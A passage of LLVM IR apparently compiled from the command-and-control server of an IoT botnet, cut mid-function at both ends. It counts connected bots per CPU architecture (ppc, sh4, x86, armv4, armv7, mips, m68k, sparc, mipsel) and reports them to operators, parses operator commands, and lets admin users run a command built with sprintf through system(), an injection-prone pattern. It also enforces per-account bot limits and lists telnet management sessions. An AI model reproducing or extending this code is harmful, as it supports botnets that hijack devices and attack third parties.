  %466 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %467 = load volatile i32, i32* @managesConnected, align 4
  %468 = call i32 (i8*, i8*, ...) @sprintf(i8* %466, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.74, i64 0, i64 0), i32 %467) #8
  %469 = load i32, i32* %6, align 4
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %471 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %472 = call i64 @strlen(i8* %471) #9
  %473 = call i64 @send(i32 %469, i8* %470, i64 %472, i32 16384)
  %474 = icmp eq i64 %473, -1
  br i1 %474, label %475, label %476

475:                                              ; preds = %465
  store i8* null, i8** %2, align 8
  br label %1133

476:                                              ; preds = %465
  %477 = load i32, i32* @ppc, align 4
  %478 = icmp ne i32 %477, 0
  br i1 %478, label %479, label %491

479:                                              ; preds = %476
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %481 = load i32, i32* @ppc, align 4
  %482 = call i32 (i8*, i8*, ...) @sprintf(i8* %480, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.75, i64 0, i64 0), i32 %481) #8
  %483 = load i32, i32* %6, align 4
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %485 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %486 = call i64 @strlen(i8* %485) #9
  %487 = call i64 @send(i32 %483, i8* %484, i64 %486, i32 16384)
  %488 = icmp eq i64 %487, -1
  br i1 %488, label %489, label %490

489:                                              ; preds = %479
  store i8* null, i8** %2, align 8
  br label %1133

490:                                              ; preds = %479
  br label %491

491:                                              ; preds = %490, %476
  %492 = load i32, i32* @sh4, align 4
  %493 = icmp ne i32 %492, 0
  br i1 %493, label %494, label %506

494:                                              ; preds = %491
  %495 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %496 = load i32, i32* @sh4, align 4
  %497 = call i32 (i8*, i8*, ...) @sprintf(i8* %495, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.76, i64 0, i64 0), i32 %496) #8
  %498 = load i32, i32* %6, align 4
  %499 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %500 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %501 = call i64 @strlen(i8* %500) #9
  %502 = call i64 @send(i32 %498, i8* %499, i64 %501, i32 16384)
  %503 = icmp eq i64 %502, -1
  br i1 %503, label %504, label %505

504:                                              ; preds = %494
  store i8* null, i8** %2, align 8
  br label %1133

505:                                              ; preds = %494
  br label %506

506:                                              ; preds = %505, %491
  %507 = load i32, i32* @x86, align 4
  %508 = icmp ne i32 %507, 0
  br i1 %508, label %509, label %521

509:                                              ; preds = %506
  %510 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %511 = load i32, i32* @x86, align 4
  %512 = call i32 (i8*, i8*, ...) @sprintf(i8* %510, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.77, i64 0, i64 0), i32 %511) #8
  %513 = load i32, i32* %6, align 4
  %514 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %515 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %516 = call i64 @strlen(i8* %515) #9
  %517 = call i64 @send(i32 %513, i8* %514, i64 %516, i32 16384)
  %518 = icmp eq i64 %517, -1
  br i1 %518, label %519, label %520

519:                                              ; preds = %509
  store i8* null, i8** %2, align 8
  br label %1133

520:                                              ; preds = %509
  br label %521

521:                                              ; preds = %520, %506
  %522 = load i32, i32* @armv4, align 4
  %523 = icmp ne i32 %522, 0
  br i1 %523, label %524, label %536

524:                                              ; preds = %521
  %525 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %526 = load i32, i32* @armv4, align 4
  %527 = call i32 (i8*, i8*, ...) @sprintf(i8* %525, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.78, i64 0, i64 0), i32 %526) #8
  %528 = load i32, i32* %6, align 4
  %529 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %530 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %531 = call i64 @strlen(i8* %530) #9
  %532 = call i64 @send(i32 %528, i8* %529, i64 %531, i32 16384)
  %533 = icmp eq i64 %532, -1
  br i1 %533, label %534, label %535

534:                                              ; preds = %524
  store i8* null, i8** %2, align 8
  br label %1133

535:                                              ; preds = %524
  br label %536

536:                                              ; preds = %535, %521
  %537 = load i32, i32* @armv7, align 4
  %538 = icmp ne i32 %537, 0
  br i1 %538, label %539, label %551

539:                                              ; preds = %536
  %540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %541 = load i32, i32* @armv7, align 4
  %542 = call i32 (i8*, i8*, ...) @sprintf(i8* %540, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.79, i64 0, i64 0), i32 %541) #8
  %543 = load i32, i32* %6, align 4
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %545 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %546 = call i64 @strlen(i8* %545) #9
  %547 = call i64 @send(i32 %543, i8* %544, i64 %546, i32 16384)
  %548 = icmp eq i64 %547, -1
  br i1 %548, label %549, label %550

549:                                              ; preds = %539
  store i8* null, i8** %2, align 8
  br label %1133

550:                                              ; preds = %539
  br label %551

551:                                              ; preds = %550, %536
  %552 = load i32, i32* @mips, align 4
  %553 = icmp ne i32 %552, 0
  br i1 %553, label %554, label %566

554:                                              ; preds = %551
  %555 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %556 = load i32, i32* @mips, align 4
  %557 = call i32 (i8*, i8*, ...) @sprintf(i8* %555, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.80, i64 0, i64 0), i32 %556) #8
  %558 = load i32, i32* %6, align 4
  %559 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %560 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %561 = call i64 @strlen(i8* %560) #9
  %562 = call i64 @send(i32 %558, i8* %559, i64 %561, i32 16384)
  %563 = icmp eq i64 %562, -1
  br i1 %563, label %564, label %565

564:                                              ; preds = %554
  store i8* null, i8** %2, align 8
  br label %1133

565:                                              ; preds = %554
  br label %566

566:                                              ; preds = %565, %551
  %567 = load i32, i32* @m68k, align 4
  %568 = icmp ne i32 %567, 0
  br i1 %568, label %569, label %581

569:                                              ; preds = %566
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %571 = load i32, i32* @m68k, align 4
  %572 = call i32 (i8*, i8*, ...) @sprintf(i8* %570, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.81, i64 0, i64 0), i32 %571) #8
  %573 = load i32, i32* %6, align 4
  %574 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %575 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %576 = call i64 @strlen(i8* %575) #9
  %577 = call i64 @send(i32 %573, i8* %574, i64 %576, i32 16384)
  %578 = icmp eq i64 %577, -1
  br i1 %578, label %579, label %580

579:                                              ; preds = %569
  store i8* null, i8** %2, align 8
  br label %1133

580:                                              ; preds = %569
  br label %581

581:                                              ; preds = %580, %566
  %582 = load i32, i32* @sparc, align 4
  %583 = icmp ne i32 %582, 0
  br i1 %583, label %584, label %596

584:                                              ; preds = %581
  %585 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %586 = load i32, i32* @sparc, align 4
  %587 = call i32 (i8*, i8*, ...) @sprintf(i8* %585, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.82, i64 0, i64 0), i32 %586) #8
  %588 = load i32, i32* %6, align 4
  %589 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %590 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %591 = call i64 @strlen(i8* %590) #9
  %592 = call i64 @send(i32 %588, i8* %589, i64 %591, i32 16384)
  %593 = icmp eq i64 %592, -1
  br i1 %593, label %594, label %595

594:                                              ; preds = %584
  store i8* null, i8** %2, align 8
  br label %1133

595:                                              ; preds = %584
  br label %596

596:                                              ; preds = %595, %581
  %597 = load i32, i32* @mipsel, align 4
  %598 = icmp ne i32 %597, 0
  br i1 %598, label %599, label %611

599:                                              ; preds = %596
  %600 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %601 = load i32, i32* @mipsel, align 4
  %602 = call i32 (i8*, i8*, ...) @sprintf(i8* %600, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.83, i64 0, i64 0), i32 %601) #8
  %603 = load i32, i32* %6, align 4
  %604 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %605 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %606 = call i64 @strlen(i8* %605) #9
  %607 = call i64 @send(i32 %603, i8* %604, i64 %606, i32 16384)
  %608 = icmp eq i64 %607, -1
  br i1 %608, label %609, label %610

609:                                              ; preds = %599
  store i8* null, i8** %2, align 8
  br label %1133

610:                                              ; preds = %599
  br label %611

611:                                              ; preds = %610, %596
  %612 = load i32, i32* @unknown, align 4
  %613 = icmp ne i32 %612, 0
  br i1 %613, label %614, label %626

614:                                              ; preds = %611
  %615 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %616 = load i32, i32* @unknown, align 4
  %617 = call i32 (i8*, i8*, ...) @sprintf(i8* %615, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.84, i64 0, i64 0), i32 %616) #8
  %618 = load i32, i32* %6, align 4
  %619 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %620 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %621 = call i64 @strlen(i8* %620) #9
  %622 = call i64 @send(i32 %618, i8* %619, i64 %621, i32 16384)
  %623 = icmp eq i64 %622, -1
  br i1 %623, label %624, label %625

624:                                              ; preds = %614
  store i8* null, i8** %2, align 8
  br label %1133

625:                                              ; preds = %614
  br label %626

626:                                              ; preds = %625, %611
  %627 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %628 = call i32 @clientsConnected()
  %629 = call i32 (i8*, i8*, ...) @sprintf(i8* %627, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.85, i64 0, i64 0), i32 %628) #8
  %630 = load i32, i32* %6, align 4
  %631 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %632 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %633 = call i64 @strlen(i8* %632) #9
  %634 = call i64 @send(i32 %630, i8* %631, i64 %633, i32 16384)
  %635 = icmp eq i64 %634, -1
  br i1 %635, label %636, label %637

636:                                              ; preds = %626
  store i8* null, i8** %2, align 8
  br label %1133

637:                                              ; preds = %626
  %638 = load i32, i32* %8, align 4
  %639 = sext i32 %638 to i64
  %640 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %639
  %641 = getelementptr inbounds %struct.account, %struct.account* %640, i32 0, i32 4
  %642 = load i32, i32* %641, align 4
  %643 = call i32 @clientsConnected()
  %644 = icmp ult i32 %642, %643
  br i1 %644, label %645, label %653

645:                                              ; preds = %637
  %646 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %647 = load i32, i32* %8, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %648
  %650 = getelementptr inbounds %struct.account, %struct.account* %649, i32 0, i32 4
  %651 = load i32, i32* %650, align 4
  %652 = call i32 (i8*, i8*, ...) @sprintf(i8* %646, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.86, i64 0, i64 0), i32 %651) #8
  br label %666

653:                                              ; preds = %637
  %654 = load i32, i32* %8, align 4
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %655
  %657 = getelementptr inbounds %struct.account, %struct.account* %656, i32 0, i32 4
  %658 = load i32, i32* %657, align 4
  %659 = call i32 @clientsConnected()
  %660 = icmp ugt i32 %658, %659
  br i1 %660, label %661, label %665

661:                                              ; preds = %653
  %662 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %663 = call i32 @clientsConnected()
  %664 = call i32 (i8*, i8*, ...) @sprintf(i8* %662, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.86, i64 0, i64 0), i32 %663) #8
  br label %665

665:                                              ; preds = %661, %653
  br label %666

666:                                              ; preds = %665, %645
  %667 = load i32, i32* %6, align 4
  %668 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %669 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %670 = call i64 @strlen(i8* %669) #9
  %671 = call i64 @send(i32 %667, i8* %668, i64 %670, i32 16384)
  %672 = icmp eq i64 %671, -1
  br i1 %672, label %673, label %674

673:                                              ; preds = %666
  store i8* null, i8** %2, align 8
  br label %1133

674:                                              ; preds = %666
  br label %675

675:                                              ; preds = %674, %464
  br label %991

676:                                              ; preds = %446
  %677 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %678 = call i8* @strstr(i8* %677, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i64 0, i64 0)) #9
  %679 = icmp ne i8* %678, null
  br i1 %679, label %680, label %691

680:                                              ; preds = %676
  %681 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %682 = call i32 (i8*, i8*, ...) @sprintf(i8* %681, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.88, i64 0, i64 0)) #8
  %683 = load i32, i32* %6, align 4
  %684 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %685 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %686 = call i64 @strlen(i8* %685) #9
  %687 = call i64 @send(i32 %683, i8* %684, i64 %686, i32 16384)
  %688 = icmp eq i64 %687, -1
  br i1 %688, label %689, label %690

689:                                              ; preds = %680
  store i8* null, i8** %2, align 8
  br label %1133

690:                                              ; preds = %680
  br label %990

691:                                              ; preds = %676
  %692 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %693 = call i8* @strstr(i8* %692, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i64 0, i64 0)) #9
  %694 = icmp ne i8* %693, null
  br i1 %694, label %699, label %695

695:                                              ; preds = %691
  %696 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %697 = call i8* @strstr(i8* %696, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i64 0, i64 0)) #9
  %698 = icmp ne i8* %697, null
  br i1 %698, label %699, label %721

699:                                              ; preds = %695, %691
  %700 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %701 = call i8* @strtok(i8* %700, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i64 0, i64 0)) #8
  store i8* %701, i8** %27, align 8
  %702 = load i8*, i8** %27, align 8
  %703 = getelementptr inbounds i8, i8* %702, i64 8
  store i8* %703, i8** %28, align 8
  %704 = load i8*, i8** %28, align 8
  call void @trim(i8* %704)
  %705 = load i8*, i8** %28, align 8
  %706 = getelementptr inbounds [100 x i8*], [100 x i8*]* %26, i64 0, i64 0
  %707 = bitcast i8** %706 to i8*
  %708 = call i32 @resolvehttp(i8* %705, i8* %707)
  %709 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %710 = load i8*, i8** %28, align 8
  %711 = getelementptr inbounds [100 x i8*], [100 x i8*]* %26, i64 0, i64 0
  %712 = call i32 (i8*, i8*, ...) @sprintf(i8* %709, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.92, i64 0, i64 0), i8* %710, i8** %711) #8
  %713 = load i32, i32* %6, align 4
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %715 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %716 = call i64 @strlen(i8* %715) #9
  %717 = call i64 @send(i32 %713, i8* %714, i64 %716, i32 16384)
  %718 = icmp eq i64 %717, -1
  br i1 %718, label %719, label %720

719:                                              ; preds = %699
  store i8* null, i8** %2, align 8
  br label %1133

720:                                              ; preds = %699
  br label %989

721:                                              ; preds = %695
  %722 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %723 = call i8* @strstr(i8* %722, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #9
  %724 = icmp ne i8* %723, null
  br i1 %724, label %729, label %725

725:                                              ; preds = %721
  %726 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %727 = call i8* @strstr(i8* %726, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.94, i64 0, i64 0)) #9
  %728 = icmp ne i8* %727, null
  br i1 %728, label %729, label %780

729:                                              ; preds = %725, %721
  %730 = load i32, i32* @adminstatus, align 4
  %731 = icmp eq i32 %730, 1
  br i1 %731, label %732, label %768

732:                                              ; preds = %729
  %733 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %734 = call i8* @strtok(i8* %733, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.91, i64 0, i64 0)) #8
  store i8* %734, i8** %29, align 8
  %735 = load i8*, i8** %29, align 8
  %736 = getelementptr inbounds i8, i8* %735, i64 8
  store i8* %736, i8** %30, align 8
  %737 = load i8*, i8** %30, align 8
  call void @trim(i8* %737)
  %738 = getelementptr inbounds [50 x i8*], [50 x i8*]* %31, i64 0, i64 0
  %739 = bitcast i8** %738 to i8*
  %740 = load i8*, i8** %30, align 8
  %741 = call i32 (i8*, i8*, ...) @sprintf(i8* %739, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.95, i64 0, i64 0), i8* %740) #8
  %742 = getelementptr inbounds [50 x i8*], [50 x i8*]* %31, i64 0, i64 0
  %743 = bitcast i8** %742 to i8*
  %744 = call i32 @system(i8* %743)
  %745 = load i32, i32* %8, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %746
  %748 = getelementptr inbounds %struct.account, %struct.account* %747, i32 0, i32 0
  %749 = getelementptr inbounds [200 x i8], [200 x i8]* %748, i64 0, i64 0
  %750 = load i8*, i8** %30, align 8
  %751 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.96, i64 0, i64 0), i8* %749, i8* %750)
  %752 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %753 = load i32, i32* %8, align 4
  %754 = sext i32 %753 to i64
  %755 = getelementptr inbounds [15 x %struct.account], [15 x %struct.account]* @accounts, i64 0, i64 %754
  %756 = getelementptr inbounds %struct.account, %struct.account* %755, i32 0, i32 0
  %757 = getelementptr inbounds [200 x i8], [200 x i8]* %756, i64 0, i64 0
  %758 = load i8*, i8** %30, align 8
  %759 = call i32 (i8*, i8*, ...) @sprintf(i8* %752, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i64 0, i64 0), i8* %757, i8* %758) #8
  %760 = load i32, i32* %6, align 4
  %761 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %763 = call i64 @strlen(i8* %762) #9
  %764 = call i64 @send(i32 %760, i8* %761, i64 %763, i32 16384)
  %765 = icmp eq i64 %764, -1
  br i1 %765, label %766, label %767

766:                                              ; preds = %732
  store i8* null, i8** %2, align 8
  br label %1133

767:                                              ; preds = %732
  br label %779

768:                                              ; preds = %729
  %769 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %770 = call i32 (i8*, i8*, ...) @sprintf(i8* %769, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.98, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.99, i64 0, i64 0)) #8
  %771 = load i32, i32* %6, align 4
  %772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %773 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %774 = call i64 @strlen(i8* %773) #9
  %775 = call i64 @send(i32 %771, i8* %772, i64 %774, i32 16384)
  %776 = icmp eq i64 %775, -1
  br i1 %776, label %777, label %778

777:                                              ; preds = %768
  store i8* null, i8** %2, align 8
  br label %1133

778:                                              ; preds = %768
  br label %779

779:                                              ; preds = %778, %767
  br label %988

780:                                              ; preds = %725
  %781 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %782 = call i8* @strstr(i8* %781, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i64 0, i64 0)) #9
  %783 = icmp ne i8* %782, null
  br i1 %783, label %784, label %825

784:                                              ; preds = %780
  store i32 0, i32* %32, align 4
  br label %785

785:                                              ; preds = %821, %784
  %786 = load i32, i32* %32, align 4
  %787 = icmp slt i32 %786, 1000000
  br i1 %787, label %788, label %824

788:                                              ; preds = %785
  %789 = load i32, i32* %32, align 4
  %790 = sext i32 %789 to i64
  %791 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %790
  %792 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %791, i32 0, i32 2
  %793 = getelementptr inbounds [20 x i8], [20 x i8]* %792, i64 0, i64 0
  %794 = call i64 @strlen(i8* %793) #9
  %795 = icmp ugt i64 %794, 1
  br i1 %795, label %796, label %820

796:                                              ; preds = %788
  %797 = load i32, i32* %32, align 4
  %798 = sext i32 %797 to i64
  %799 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %798
  %800 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %799, i32 0, i32 1
  %801 = load i32, i32* %800, align 4
  %802 = icmp eq i32 %801, 1
  br i1 %802, label %803, label %820

803:                                              ; preds = %796
  %804 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %805 = load i32, i32* %32, align 4
  %806 = load i32, i32* %32, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %807
  %809 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %808, i32 0, i32 2
  %810 = getelementptr inbounds [20 x i8], [20 x i8]* %809, i64 0, i64 0
  %811 = call i32 (i8*, i8*, ...) @sprintf(i8* %804, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.101, i64 0, i64 0), i32 %805, i8* %810) #8
  %812 = load i32, i32* %6, align 4
  %813 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %815 = call i64 @strlen(i8* %814) #9
  %816 = call i64 @send(i32 %812, i8* %813, i64 %815, i32 16384)
  %817 = icmp eq i64 %816, -1
  br i1 %817, label %818, label %819

818:                                              ; preds = %803
  store i8* null, i8** %2, align 8
  br label %1133

819:                                              ; preds = %803
  br label %820

820:                                              ; preds = %819, %796, %788
  br label %821

821:                                              ; preds = %820
  %822 = load i32, i32* %32, align 4
  %823 = add nsw i32 %822, 1
  store i32 %823, i32* %32, align 4
  br label %785, !llvm.loop !24

824:                                              ; preds = %785
  br label %987

825:                                              ; preds = %780
  %826 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %827 = call i8* @strstr(i8* %826, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0)) #9
  %828 = icmp ne i8* %827, null
  br i1 %828, label %833, label %829

829:                                              ; preds = %825
  %830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %831 = call i8* @strstr(i8* %830, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i64 0, i64 0)) #9
  %832 = icmp ne i8* %831, null
  br i1 %832, label %833, label %884

833:                                              ; preds = %829, %825
  %834 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %835 = call i32 (i8*, i8*, ...) @sprintf(i8* %834, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.104, i64 0, i64 0)) #8
  %836 = load i32, i32* %6, align 4
  %837 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %838 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %839 = call i64 @strlen(i8* %838) #9
  %840 = call i64 @send(i32 %836, i8* %837, i64 %839, i32 16384)
  %841 = icmp eq i64 %840, -1
  br i1 %841, label %842, label %843

842:                                              ; preds = %833
  store i8* null, i8** %2, align 8
  br label %1133

843:                                              ; preds = %833
  %844 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %845 = call i32 (i8*, i8*, ...) @sprintf(i8* %844, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.105, i64 0, i64 0)) #8
  %846 = load i32, i32* %6, align 4
  %847 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %849 = call i64 @strlen(i8* %848) #9
  %850 = call i64 @send(i32 %846, i8* %847, i64 %849, i32 16384)
  %851 = icmp eq i64 %850, -1
  br i1 %851, label %852, label %853

852:                                              ; preds = %843
  store i8* null, i8** %2, align 8
  br label %1133

853:                                              ; preds = %843
  %854 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %855 = call i32 (i8*, i8*, ...) @sprintf(i8* %854, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.106, i64 0, i64 0)) #8
  %856 = load i32, i32* %6, align 4
  %857 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %858 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %859 = call i64 @strlen(i8* %858) #9
  %860 = call i64 @send(i32 %856, i8* %857, i64 %859, i32 16384)
  %861 = icmp eq i64 %860, -1
  br i1 %861, label %862, label %863

862:                                              ; preds = %853
  store i8* null, i8** %2, align 8
  br label %1133

863:                                              ; preds = %853
  %864 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %865 = call i32 (i8*, i8*, ...) @sprintf(i8* %864, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.107, i64 0, i64 0)) #8
  %866 = load i32, i32* %6, align 4
  %867 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %868 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %869 = call i64 @strlen(i8* %868) #9
  %870 = call i64 @send(i32 %866, i8* %867, i64 %869, i32 16384)
  %871 = icmp eq i64 %870, -1
  br i1 %871, label %872, label %873

872:                                              ; preds = %863
  store i8* null, i8** %2, align 8
  br label %1133

873:                                              ; preds = %863
  %874 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %875 = call i32 (i8*, i8*, ...) @sprintf(i8* %874, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.108, i64 0, i64 0)) #8
  %876 = load i32, i32* %6, align 4
  %877 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %878 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  %879 = call i64 @strlen(i8* %878) #9
  %880 = call i64 @send(i32 %876, i8* %877, i64 %879, i32 16384)
  %881 = icmp eq i64 %880, -1
  br i1 %881, label %882, label %883

882:                                              ; preds = %873
  store i8* null, i8** %2, align 8
  br label %1133

883:                                              ; preds = %873
  br label %986

884:                                              ; preds = %829
  %885 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %886 = call i8* @strstr(i8* %885, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0)) #9
  %887 = icmp ne i8* %886, null
  br i1 %887, label %892, label %888

888:                                              ; preds = %884
  %889 = getelementptr inbounds [2048 x i8], [2048 x i8]* %11, i64 0, i64 0
  %890 = call i8* @strstr(i8* %889, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.109, i64 0, i64 0)) #9
  %891 = icmp ne i8* %890, null
  br i1 %891, label %892, label %938

892:                                              ; preds = %888, %884
  %893 = load i32, i32* @adminstatus, align 4
  %894 = icmp eq i32 %893, 1
  br i1 %894, label %895, label %926

895:                                              ; preds = %892
